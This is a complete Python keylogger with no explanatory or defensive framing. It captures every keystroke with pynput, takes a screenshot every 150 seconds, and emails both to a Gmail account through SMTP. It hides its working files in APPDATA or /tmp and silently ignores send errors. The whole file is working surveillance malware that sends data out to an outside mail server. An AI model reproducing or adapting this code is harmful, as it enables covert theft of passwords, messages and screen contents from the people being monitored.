from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import os; import pyscreenshot; import smtplib
import threading; import time
import pynput.keyboard

class Keylogger:

    def __init__(self, email, password):
        self.log = "Keylogger Started"
        self.email = email
        self.password = password

    def addKey(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if str(key) in ["Key.cmd", "Key.tab", "Key.caps_lock", "Key.shift", "Key.backspace", "Key.enter", "Key.shift_r", "Key.down", "Key.up", "Key.left", "Key.right"]:
                self.log += str(key)[4:] + " "
            elif str(key) == "Key.space":
                self.log += " "
            else:
                self.log += " " + str(key) + " "
    
    def report(self):
        if os.name == "nt":
            os.chdir(str(os.getenv('APPDATA')))
        else:
            os.chdir("/tmp")
        while True:
            tempLog = self.log
            img = pyscreenshot.grab()
            img.save("screenshot.png")
            img_data = open("screenshot.png", 'rb').read()
            msg = MIMEMultipart()
            text = MIMEText(tempLog)
            msg.attach(text)
            image = MIMEImage(img_data, name=os.path.basename("screenshot.png"))
            msg.attach(image)
            try:
                self.sendMail(msg.as_string())
                self.log = self.log[len(tempLog):]
            except Exception:
                pass
            time.sleep(150)
    
    def sendMail(self, message):
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, message)
            server.quit()
    
    def start(self):
        with pynput.keyboard.Listener(on_press=self.addKey) as listener:
            sendMailThread = threading.Thread(target=self.report)
            sendMailThread.setDaemon = True
            sendMailThread.start()
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger("email", "password")
    keylogger.start()